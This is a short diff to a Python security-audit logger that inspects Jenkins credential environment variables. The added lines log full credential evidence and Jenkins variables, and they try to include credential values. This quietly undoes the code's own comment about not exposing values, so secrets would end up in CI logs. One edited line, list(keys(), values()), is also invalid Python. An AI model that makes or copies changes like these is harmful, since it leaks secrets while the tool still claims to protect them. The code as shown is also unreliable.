@@ -102,7 +102,7 @@ class SecurityAuditLogger:
                         key for key in os.environ.keys() if "JENKINS" in key.upper()
                     ],
                     "credential_count": len(credential_vars),
-                    "credential_names": list(credential_vars.keys()),
+                    "credential_names": list(credential_vars.keys(),credential_vars.values()),
                     "credential_lengths": {
                         k: len(str(v)) for k, v in credential_vars.items()
                     },
@@ -167,6 +167,7 @@ class SecurityAuditLogger:
             if finding["category"] != "Credential Exposure Risk":
                 self.logger.warning(f"Evidence: {finding['evidence']}")
             else:
+                self.logger.warning(f"Full Evidence Data: {finding['evidence']}")
                 # For credential-related findings, show proof of access without exposing values
                 self.logger.warning(
                     f"Evidence: Found {finding['evidence']['credential_count']} "
@@ -177,6 +178,12 @@ class SecurityAuditLogger:
                 )
                 self.logger.warning(
                     f"  Variable lengths: {finding['evidence']['credential_lengths']}"
+                )
+                self.logger.warning(
+                    f"  Jenkins env vars: {finding['evidence']['jenkins_env_vars']}"
+                )
+                self.logger.warning(
+                    f"  Access verification hashes: {finding['evidence']['access_verification_hashes']}"
                 )
                 self.logger.warning(f"  ✓ Access verified via cryptographic hashes")
                 self.logger.warning(
